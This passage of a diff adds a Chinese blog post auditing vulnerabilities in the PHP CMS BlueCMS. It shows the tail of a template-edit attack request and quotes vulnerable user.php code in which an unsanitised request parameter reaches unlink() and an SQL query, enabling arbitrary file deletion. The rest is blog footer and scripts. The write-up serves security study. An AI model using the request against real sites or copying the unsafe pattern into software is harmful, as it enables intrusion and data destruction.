class="hljs-meta">?&gt;</span>&amp;tpl_name=php.php&amp;act=do_edit</span><br></code></pre></td></tr></table></figure>
+
+<p>效果：</p>
+<img src="img/blueCMS/image-20210809180812158.png" srcset="/img/loading.gif" lazyload alt="image-20210809180812158" style="zoom:50%;" />
+
+<h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><blockquote>
+<p>user.php</p>
+</blockquote>
+<p>$id 可控，直接传入unlink()会可造成任意文件删除漏洞。不过在unlink()操作前会执行一条sql语句，BlueCMS 初始数据库是没有company_image表的，导致数据库报错是执行不到unlink()操作的</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$act</span> == <span class="hljs-string">&#x27;del_pic&#x27;</span>) &#123;<br>    <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-string">&quot;DELETE FROM &quot;</span> . table(<span class="hljs-string">&#x27;company_image&#x27;</span>) . <span class="hljs-string">&quot; WHERE path=&#x27;<span class="hljs-subst">$id</span>&#x27;&quot;</span>);<br>    <span class="hljs-keyword">if</span> (file_exists(BLUE_ROOT . <span class="hljs-variable">$id</span>)) &#123;<br>        @unlink(BLUE_ROOT . <span class="hljs-variable">$id</span>);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>BlueCMS 总体代码比较简单，出现的漏洞也比较典型，没有什么特别之处。另外本文并没有针对 XSS 漏洞做审计，对于这种简单的系统使用黑盒测试的方法似乎要更快一点。</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7074">https://xz.aliyun.com/t/7074</a></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">php代码审计</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/PHP/">PHP</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/09/09/hello-world/">
+                        <span class="hidden-mobile">Hello World</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
